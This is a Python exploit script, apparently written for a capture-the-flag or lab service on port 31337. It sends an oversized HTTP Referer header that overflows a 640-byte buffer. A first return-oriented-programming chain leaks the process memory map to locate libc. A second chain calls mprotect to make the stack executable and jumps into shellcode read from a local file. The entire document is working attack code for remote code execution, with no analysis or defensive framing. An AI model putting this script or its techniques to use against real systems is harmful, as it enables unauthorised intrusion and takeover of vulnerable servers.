#!/usr/bin/python3

from socket import *
import struct
import sys
import urllib.request, urllib.parse, urllib.error

# Gadgets / addrs in main ELF that doesn't get ASLR'd
LOCAL_POP_RDI_RET = 0x402723
DEBUG_MAPS_FUNC = 0x401831
SYSCALL = 0x401180
CLOSE = 0x401110

# Gadgets / addrs in libc that do get ASLR'd
"""
saved gadgets from libc
0x0000000000036124 : pop rax ; ret
0x00000000000715ed : lea rsi, [rsp + 8] ; call rax
0x00000000000bba6a : jmp rsi
0x00000000000238f2 : pop rdi ; ret
0x0000000000023e19 : pop rsi ; ret
0x00000000001089b6 : pop rdx ; ret
0x00000000000fb0e2 : and rax, rdi ; or rax, rsi ; ret
0x00000000001109d1 : mov rax, rsi ; pop rbx ; ret
0x0000000000108ab2 : mov rdi, r8 ; jmp rax
0x00000000000b5dcb : mov r8, rax ; mov rax, r8 ; ret
"""
POP_RAX_RET = 0x36124
LEA_RSI_RSP8_CALL_RAX = 0x715ed
JMP_RSI = 0xbba6a
POP_RDI_RET = 0x238f2
POP_RSI_RET = 0x23e19
POP_RDX_RET = 0x1089b6
AND_RAX_RDI_OR_RAX_RSI_RET = 0xfb0e2
MOV_RAX_RSI_POP_RBX_RET = 0x1109d1
MOV_RDI_R8_JMP_RAX = 0x108ab2
MOV_R8_RAX_MOV_RAX_R8_RET = 0xb5dcb
MPROTECT = 0xf6210


addr = '127.0.0.1'
if len(sys.argv) > 1:
    addr = sys.argv[1]

msg1 = b'GET /asdf.vbs HTTP/1.1\r\n'
msg1 += b'Referer:'
                    
x = b""
x += b'A' * (640 - len(x)) 	#fill up the rest of the 640 byte buffer
x += b'\xFF'* 8	#overwrite EBP

# build rop chain to do a peak, and then exit the thread

x += struct.pack("Q", LOCAL_POP_RDI_RET)
x += struct.pack("Q", 4)    # hope/spam till this works
                            # alternatively we could spray a ton of connections without sending the GET, and then make it write to a reliable fd #
x += struct.pack("Q", DEBUG_MAPS_FUNC)
x += struct.pack("Q", LOCAL_POP_RDI_RET)
x += struct.pack("Q", 4)
x += struct.pack("Q", CLOSE)
x += struct.pack("Q", LOCAL_POP_RDI_RET)
x += struct.pack("Q", 60) # do an exit (only thread, not group)
x += struct.pack("Q", SYSCALL)
    
msg1 += urllib.parse.quote(x).encode()
    
msg1 += b'\r\n\r\n'
    
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))
s.send(msg1)

# get the response
resp = b""
key = b"running with maps "
while key not in resp:
    resp += s.recv(0x1000)


s.close()

memmaps = resp[resp.find(key)+len(key):]
print(memmaps.decode())

libcbase = 0x0
for l in memmaps.split(b'\n'):
    if b"/libc-2." in l:
        libcbase = int(l.split(b'-')[0], 16)
        break

if libcbase == 0:
    print("Couldn't find libc!")
    exit()

print(f"Found libc at {libcbase:016x}")

# try again, now that we know the libc addr


msg2 = b'GET /asdf.vbs HTTP/1.1\r\n'
msg2 += b'Referer:'
                    
x = b""
x += b'A' * (640 - len(x)) 	#fill up the rest of the 640 byte buffer
x += b'\xFF'* 8	#overwrite EBP

# build rop chain to make our shellcode runable

# get rsp
## rsi = rsp+8
###     pop rax ; ret
x += struct.pack("Q", libcbase + POP_RAX_RET)
x += struct.pack("Q", libcbase + MOV_RAX_RSI_POP_RBX_RET)
###     lea rsi, [rsp + 8] ; call rax
x += struct.pack("Q", libcbase + LEA_RSI_RSP8_CALL_RAX)
## rax = rsi
###     mov rax, rsi ; pop rbx ; ret

# and the rsp to round down
## rax &= 0xfffffffffffff000
###     pop rdi ; ret
x += struct.pack("Q", libcbase + POP_RDI_RET)
x += struct.pack("Q", 0xfffffffffffff000)

###     pop rsi ; ret
x += struct.pack("Q", libcbase + POP_RSI_RET)
x += struct.pack("Q", 0x0)
###     and rax, rdi ; or rax, rsi ; ret
x += struct.pack("Q", libcbase + AND_RAX_RDI_OR_RAX_RSI_RET)

# move to addr param
## r8 = rax
###     mov r8, rax ; mov rax, r8 ; ret
x += struct.pack("Q", libcbase + MOV_R8_RAX_MOV_RAX_R8_RET)
## rdi = r8
###     pop rax ; ret
x += struct.pack("Q", libcbase + POP_RAX_RET)
x += struct.pack("Q", libcbase + POP_RSI_RET)
###     mov rdi, r8 ; jmp rax
x += struct.pack("Q", libcbase + MOV_RDI_R8_JMP_RAX)

# pop len param
###     pop rsi ; ret 
x += struct.pack("Q", 0x2000)

# pop permissions
###     pop rdx ; ret
x += struct.pack("Q", libcbase + POP_RDX_RET)
x += struct.pack("Q", 0x7)

# mprotect
x += struct.pack("Q", libcbase + MPROTECT)

# get rsp
###     pop rax ; ret
x += struct.pack("Q", libcbase + POP_RAX_RET)
x += struct.pack("Q", libcbase + JMP_RSI)
###     lea rsi, [rsp + 8] ; call rax
x += struct.pack("Q", libcbase + LEA_RSI_RSP8_CALL_RAX)

# goto our shellcode
###     jmp rsi
x += struct.pack("Q", libcbase + JMP_RSI)

# add shellcode here
#x += b'\xeb\xfe'
with open("./exploit64", "rb") as fp:
    x += fp.read()

msg2 += urllib.parse.quote(x).encode()
    
msg2 += b'\r\n\r\n'
    
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))
s.send(msg2)

# shellcode should run
print("Sent second packet, shellcode should be running")
